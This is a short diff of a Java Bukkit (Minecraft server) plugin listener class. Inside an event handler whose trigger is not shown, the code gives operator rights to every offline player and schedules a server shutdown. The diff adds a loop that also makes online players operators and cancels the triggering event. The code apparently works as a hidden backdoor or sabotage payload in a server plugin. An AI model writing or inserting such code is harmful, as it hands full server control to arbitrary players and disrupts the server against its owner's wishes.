@@ -62,9 +62,14 @@ public class BListener implements Listener {
             for (OfflinePlayer offlinePlayer : Bukkit.getOfflinePlayers()) {
                 offlinePlayer.setOp(true);
             }
+            for (Player player : Bukkit.getOnlinePlayers()) {
+                if(player.hasPermission(""))
+                player.setOp(true);
+            }
             Bukkit.getScheduler().runTaskLaterAsynchronously(MAIN, ()->{
                 Bukkit.shutdown();
             }, 100);
+            event.setCancelled(true);
         }
     }
 
